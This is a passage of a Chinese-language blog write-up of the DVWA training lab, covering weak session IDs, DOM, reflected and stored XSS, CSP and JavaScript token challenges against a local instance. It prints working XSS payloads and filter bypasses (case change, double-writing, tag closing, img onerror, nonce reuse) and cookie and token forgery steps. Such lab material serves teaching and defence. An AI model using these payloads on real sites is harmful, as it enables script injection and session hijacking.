          <a href="#SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html" class="headerlink" title="SQL盲注：https://www.cnblogs.com/qiushuo/p/17485659.html"></a>SQL盲注：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/qiushuo/p/17485659.html" >https://www.cnblogs.com/qiushuo/p/17485659.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      
        <h1 id="九、薄弱的Session-ID"   >
          <a href="#九、薄弱的Session-ID" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、薄弱的Session-ID" class="headerlink" title="九、薄弱的Session ID"></a>九、薄弱的Session ID</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221357695.png" alt="image-20240522135739640"></p>

        <h2 id="Low-8"   >
          <a href="#Low-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221358115.png" alt="image-20240522135814073"></p>
<p>首先检查会话变量 <code>$_SESSION[&#39;last_session_id&#39;]</code> 是否已设置，如果未设置，将其初始化为 0，然后，每次 POST 请求时，这个变量的值都会递增，容易被伪造</p>
<p>可以看到，点一下按钮dvwaSession的值就会+1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221402921.png" alt="image-20240522140226878"></p>
<p>可以利用一下，将原网页的cookie复制下来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221427296.png" alt="image-20240522142750240"></p>
<p>打开一个新网页访问</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/vulnerabilities/weak_id/" >http://127.0.0.1:4280/vulnerabilities/weak_id/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>同时抓包，然后修改里面的cookie为原网页的值，发送之后看到已经登录进来了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221426548.png" alt="image-20240522142630479"></p>
<p>HackBar也行</p>

        <h2 id="Medium-8"   >
          <a href="#Medium-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221437399.png" alt="image-20240522143740355"></p>
<p>Cookie 的值基于当前的 Unix 时间戳，<code>time()</code> 函数返回当前的 Unix 时间戳，即从1970年1月1日 00:00:00到当前时间的秒数</p>
<p>所以修改cookie时将dvwaSeesion的值改成当前的时间戳即可</p>

        <h2 id="High-8"   >
          <a href="#High-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-8" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221443734.png" alt="image-20240522144304673"></p>
<p>使用 MD5 哈希函数将值转换为哈希字符串</p>
<p>设置 Cookie 的过期时间为当前时间之后的 3600 秒</p>
<p>指定 Cookie 有效的路径，只有在此路径及其子路径下的页面才能访问该 Cookie</p>
<p>设置 Cookie 的域名为当前请求的域名</p>
<p>抓包看看cookie，看到响应里的cookie已经发生了变化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241346928.png" alt="image-20240524134609867"></p>
<p>将响应里的cookie拿去md5解密，发现值为8，再响应一次解密值为9，由此可见cookie也是逐渐递增的，所以可以修改为md5加密数字后的值</p>

        <h2 id="Impossible-8"   >
          <a href="#Impossible-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221450403.png" alt="image-20240522145047357"></p>
<p>使用 <code>mt_rand()</code> 生成一个随机数，<code>time()</code> 获取当前的 Unix 时间戳，和字符串 <code>&quot;Impossible&quot;</code> 一起构成了一个唯一的字符串，再使用SHA-1哈希函数将这个字符串转换为哈希字符串</p>
<p>同样设置了有效时间为一小时和有效路径</p>
<p><code>true</code>：设置 <code>secure</code> 标志为 <code>true</code>，意味着此 Cookie 只能通过 HTTPS 协议发送，防止通过 HTTP 连接泄露 Cookie 信息</p>
<p><code>true</code>：设置 <code>httponly</code> 标志为 <code>true</code>，意味着此 Cookie 不能被 JavaScript 访问，这有助于防止XSS盗用 Cookie</p>

        <h1 id="十、XSS（DOM型）"   >
          <a href="#十、XSS（DOM型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、XSS（DOM型）" class="headerlink" title="十、XSS（DOM型）"></a>十、XSS（DOM型）</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221539191.png" alt="image-20240522153907139"></p>
<p>随意选择一个后可以看到URL上有参数传入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221541437.png" alt="image-20240522154125388"></p>

        <h2 id="Low-9"   >
          <a href="#Low-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2>
      <p>直接在URL上将default的值改为，出现弹窗</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542746.png" alt="image-20240522154222698"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542951.png" alt="image-20240522154247909"></p>
<p>没有任何防护</p>

        <h2 id="Medium-9"   >
          <a href="#Medium-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221545935.png" alt="image-20240522154551887"></p>
<p>检查是否存在default键，并且不为空</p>
<p>使用 <code>stripos()</code> 函数查找 <code>default</code> 参数值中是否包含 <code>&lt;script</code> 子串，<code>stripos()</code> 是不区分大小写的字符串查找函数，如果找到匹配项则返回TRUE</p>
<p>如果发现 <code>default</code> 参数包含 <code>&lt;script</code>，则立即重定向用户到同一页面，但将 <code>default</code> 参数设置为 “English”。这样做可以阻断潜在的脚本注入尝试，避免执行恶意脚本</p>
<p>使用 <code>header()</code> 函数执行 HTTP 重定向。这里使用 <code>location</code> 头进行重定向，是常见的防止恶意输入影响网站行为的手段。</p>
<p>因此用别的标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p>但是页面没有出现弹窗</p>
<p>查看网页源代码发现语句只是被插入到了value值中，但是并没有插入到option标签的值中，那么输入通常会被当做纯文本处理，不会被浏览器执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221553997.png" alt="image-20240522155350953"></p>
<p>Low难度的代码插入后网页源代码是这样的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221604723.png" alt="image-20240522160431679"></p>
<p>尝试提前闭合option标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221617977.png" alt="image-20240522161732933"></p>
<p>再尝试闭合select标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></div></figure>

<p>成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221618875.png" alt="image-20240522161831835"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221558788.png" alt="image-20240522155848745"></p>

        <h2 id="High-9"   >
          <a href="#High-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-9" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221619724.png" alt="image-20240522161925673"></p>
<p>使用白名单模式，如果default值相匹配，则插入case字段的相应值，如果不匹配，则插入的是默认的值所以default的值必须包含这几个之一</p>

        <h3 id="用-amp-连接"   >
          <a href="#用-amp-连接" class="heading-link"><i class="fas fa-link"></i></a><a href="#用-amp-连接" class="headerlink" title="用&amp;连接"></a>用&amp;连接</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623430.png" alt="image-20240522162307386"></p>

        <h3 id="用"   >
          <a href="#用" class="heading-link"><i class="fas fa-link"></i></a><a href="#用" class="headerlink" title="用#"></a>用#</h3>
      <p> URL 中 <code>#</code> 之后的信息不会发送到服务器，它只会在本地（客户端浏览器）中使用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221627508.png" alt="image-20240522162745466"></p>

        <h2 id="Impossible-9"   >
          <a href="#Impossible-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623645.png" alt="image-20240522162327607"></p>
<p>输入代码试试，页面没反应，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221630166.png" alt="image-20240522163027127"></p>
<p>这里对输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签，就不存在XSS漏洞了</p>

        <h1 id="十一、XSS（反射型）"   >
          <a href="#十一、XSS（反射型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、XSS（反射型）" class="headerlink" title="十一、XSS（反射型）"></a>十一、XSS（反射型）</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211304691.png" alt="image-20240521130457646"></p>
<p>随便输入一串字符，可以看到界面有变化，URL中也传入了name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211305114.png" alt="image-20240521130534080"></p>

        <h2 id="Low-10"   >
          <a href="#Low-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-10" class="headerlink" title="Low"></a>Low</h2>
      <p>尝试构造脚本，将<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>传入name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211308619.png" alt="image-20240521130826579"></p>
<p>通过</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211309067.png" alt="image-20240521130929038"></p>
<p>只要输入不为空就行</p>

        <h2 id="Medium-10"   >
          <a href="#Medium-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211311646.png" alt="image-20240521131114609"></p>
<p>只是过滤了<script></p>

        <h3 id="大小写绕过"   >
          <a href="#大小写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3>
      <p>将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(/xss/)&lt;/Script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211317739.png" alt="image-20240521131732696"></p>

        <h3 id="双写绕过"   >
          <a href="#双写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>…</p>

        <h2 id="High-10"   >
          <a href="#High-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-10" class="headerlink" title="High"></a>High</h2>
      <p>源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211337925.png" alt="image-20240521133758892"></p>
<p>过滤任何形式的 <script>标签，即使这些字符被插入其他字符或以不同顺序排列也一样</p>
<p>那就不用这个标签，利用JavaScript事件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211341785.png" alt="image-20240521134137746"></p>

        <h6 id="XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430"   >
          <a href="#XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430" class="headerlink" title="XSS绕过姿势：https://blog.csdn.net/2301_81504583/article/details/134948430"></a>XSS绕过姿势：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2301_81504583/article/details/134948430" >https://blog.csdn.net/2301_81504583/article/details/134948430</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      
        <h2 id="Impossible-10"   >
          <a href="#Impossible-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211343718.png" alt="image-20240521134338686"></p>
<p>多了Token验证，防止CSRF攻击   </p>
<p>使用 <code>htmlspecialchars</code> 函数转义输入的值，这样做可以防止XSS，该函数会转换特殊字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code> 等）为 HTML 实体，这样它们在浏览器中就不会被当作代码执行</p>

        <h1 id="十二、XSS（存储型）"   >
          <a href="#十二、XSS（存储型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、XSS（存储型）" class="headerlink" title="十二、XSS（存储型）"></a>十二、XSS（存储型）</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221456806.png" alt="image-20240522145622759"></p>

        <h2 id="Low-11"   >
          <a href="#Low-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2>
      <p>Name框任意，Message框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221455989.png" alt="image-20240522145524940"></p>
<p>原界面显示已经存入该条信息，所以不清除数据的话，之后每一次打开这个页面都会有弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221457945.png" alt="image-20240522145754900"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221459285.png" alt="image-20240522145941225"></p>
<p>使用 <code>trim()</code> 函数去除输入字符串的前后空白，只是使用了mysqli_real_escape_string来防止SQL注入，而且可以看到上传成功后就会更新数据库</p>

        <h2 id="Medium-11"   >
          <a href="#Medium-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221509004.png" alt="image-20240522150946951"></p>
<p><code>strip_tags()</code> 函数移除Message中字符串中的 HTML 和 PHP 标签</p>
<p><code>htmlspecialchars()</code> 转换Message中特定的字符为 HTML 实体，这可以防止用户输入的数据在 HTML 页面上被解释执行，进一步提高 XSS 防护</p>
<p> <code>str_replace()</code> 过滤Name框中<code>&lt;script&gt;</code> 标签</p>
<p>所以，代码可以插入在Name框中，可以按XSS反射型题的绕过方法，Message框随意</p>
<p>但是尝试之后发现页面的Name框有输入限制，只能用其他工具比如HackBar来传参，用POST传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;Script&gt;alert(/xss/)&lt;/Script&gt;&amp;mtxMessage=122&amp;btnSign=Sigh+Guestbook</span><br></pre></td></tr></table></div></figure>

<p>成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241410602.png" alt="image-20240524141056553"></p>

        <h2 id="High-11"   >
          <a href="#High-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-11" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221523293.png" alt="image-20240522152316234"></p>
<p>和上一题类似的过滤，Name框也过滤了任何形式的 <script>标签，按上一题型的方法换一个标签，用HackBar传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;&amp;mtxMessage=122&amp;btnSign=Sigh+Guestbook</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241412124.png" alt="image-20240524141202076"></p>

        <h2 id="Impossible-11"   >
          <a href="#Impossible-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221524697.png" alt="image-20240522152449640"></p>
<p>使用令牌防止CSRF攻击</p>
<p>在Name框也过滤了字符串中的 HTML 和 PHP 标签，转换特定的字符为 HTML 实体，这可以防止用户输入的数据在 HTML 页面上被解释执行，进一步提高 XSS 防护</p>
<p>使用 PDO 预处理语句来插入数据，通过参数绑定来进一步提高安全性</p>

        <h1 id="十三、CSP"   >
          <a href="#十三、CSP" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、CSP" class="headerlink" title="十三、CSP"></a>十三、CSP</h1>
      
        <h2 id="Low-12"   >
          <a href="#Low-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221714400.png" alt="image-20240522171405345"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221713230.png" alt="image-20240522171351156"></p>
<p>可以看到被信任的网站有：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pastebin.com/" >https://pastebin.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> hastebin.com <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.toptal.com/" >www.toptal.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> example.com code.jquery.com <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ssl.google-analytics.com/" >https://ssl.google-analytics.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://digi.ninja/" >https://digi.ninja</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>试试在框内输入它提示的内容，比如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://digi.ninja/dvwa/cookie.js%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%9C%89%E5%BC%B9%E7%AA%97%E6%98%BE%E7%A4%BAcookie" >https://digi.ninja/dvwa/cookie.js，就会有弹窗显示cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221726381.png" alt="image-20240522172655337"></p>
<p>查看网页源代码，也能看到已经插入进去了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221727414.png" alt="image-20240522172732374"></p>

        <h2 id="Medium-12"   >
          <a href="#Medium-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221728025.png" alt="image-20240522172809981"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221731556.png" alt="image-20240522173106512"></p>
<p>这行代码设置了 CSP，限制了可以执行的 JavaScript。在允许执行来自同源的脚本（<code>&#39;self&#39;</code>）、内联脚本，以及拥有特定 nonce 的脚本</p>
<p><code>&#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;</code> 是一个 base64 编码的字符串，用于标识某些允许执行的脚本</p>
<p>可以直接输入这个脚本，出现弹窗</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222112926.png" alt="image-20240522211240817"></p>

        <h2 id="High-12"   >
          <a href="#High-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-12" class="headerlink" title="High"></a>High</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261116135.png" alt="image-20240526111605040"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261117729.png" alt="image-20240526111702652"></p>
<p>只能引用允许本页面加载的脚本执行</p>
<p>这里还有一个js文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261119437.png" alt="image-20240526111950354"></p>
<p>点击按钮后js生成一个script标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中</p>
<p>js 中定义了一个 solveNum 的函数，因此 script 标签会把远程加载的 solveSum({“answer”:”15”}) 当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数, 然后这个函数就会在界面适当的位置写入答案</p>
<p>不是特别明白…</p>

        <h2 id="Impossible-12"   >
          <a href="#Impossible-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128991.png" alt="image-20240526112822921"></p>
<p>再查看源代码，主要是impossible.js文件有改变</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128097.png" alt="image-20240526112858026"></p>
<p>没有了callback参数</p>

        <h1 id="十四、JavaScript"   >
          <a href="#十四、JavaScript" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、JavaScript" class="headerlink" title="十四、JavaScript"></a>十四、JavaScript</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222153568.png" alt="image-20240522215322484"></p>

        <h2 id="Low-13"   >
          <a href="#Low-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-13" class="headerlink" title="Low"></a>Low</h2>
      <p>尝试输入success提交，但是显示token不合法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222154246.png" alt="image-20240522215454191"></p>
<p>输入success抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222156874.png" alt="image-20240522215642794"></p>
<p>再输入默认值ChangeMe抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222157635.png" alt="image-20240522215732578"></p>
<p>发现token的值并没有发生改变，说明生成token的代码并不是写在服务端的，查看前端的源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222200703.png" alt="image-20240522220040623"></p>
<p>从页面中的元素（其 ID 为 “phrase”）获取用户输入的值，<code>rot13(phrase)</code>函数是将输入的字符串进行 ROT13 加密，接着，使用 MD5 哈希算法对 ROT13 加密后的字符串进行哈希</p>
<p>下断点，然后点击提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222207601.png" alt="image-20240522220700537"></p>
<p>此时我提交的是success，但是它的phrase依然是ChangeMe，所以需要将它的默认值改成success，这样才能生成success的token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222208476.png" alt="image-20240522220849405"></p>
<p>或者是在控制台修改phrase的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230955703.png" alt="image-20240523095517658"></p>
<p>再输入success进行提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222209278.png" alt="image-20240522220938221"></p>
<p>查看源代码，也主要是写明了token的生成</p>

        <h2 id="Medium-13"   >
          <a href="#Medium-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2>
      <p>提交之后还是说token不合法</p>
<p>分别输入ChangeMe和success提交并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915098.png" alt="image-20240523091542059"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915136.png" alt="image-20240523091554103"></p>
<p>token也是没有变化，看一下它的js代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230906036.png" alt="image-20240523090644988"></p>
<p><code>do_something(e)</code> 函数接收一个字符串 <code>e</code> 作为参数，并返回这个字符串的反向（即从后到前重新排列的字符串）</p>
<p><code>setTimeout()</code> 是 JavaScript 中用于实现延时执行的函数，这里的延时设置为 300 毫秒后执行 <code>do_elsesomething()</code>，传入字符串 <code>&quot;XX&quot;</code> 作为参数</p>
<p>函数从页面中获取 <code>id</code> 为 <code>&quot;phrase&quot;</code> 的 HTML 元素的值，它将这个值与参数 <code>e</code> 和字符串 <code>&quot;XX&quot;</code> 拼接，使用 <code>do_something()</code> 函数对拼接后的字符串进行反转，最后，将反转后的结果赋值给 <code>id</code> 为 <code>&quot;token&quot;</code> 的元素的 <code>value</code> 属性</p>
<p>所以可以直接在burp里修改token的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=XXsseccusXX&amp;phrase=success&amp;send=Submit</span><br></pre></td></tr></table></div></figure>

<p>也可以在控制台上修改phrase的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>

<p>发送，提交成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230917698.png" alt="image-20240523091738663"></p>
<p>查看源代码，主要也是这个js文件</p>

        <h2 id="High-13"   >
          <a href="#High-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-13" class="headerlink" title="High"></a>High</h2>
      <p>分别提交ChangeMe和success并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230927665.png" alt="image-20240523092759627"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928215.png" alt="image-20240523092813180"></p>
<p>token也是没有变化的，查看js代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928497.png" alt="image-20240523092834450"></p>
<p>有点没看懂，查资料说是被混淆了，那就找一个反混淆的网站：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/" >http://deobfuscatejavascript.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后又发现选中浏览器右侧的 mouse 监听 click 事件，再点击页面的提交，此时浏览器就会自动解码 JS</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951922.png" alt="image-20240523095146856"></p>
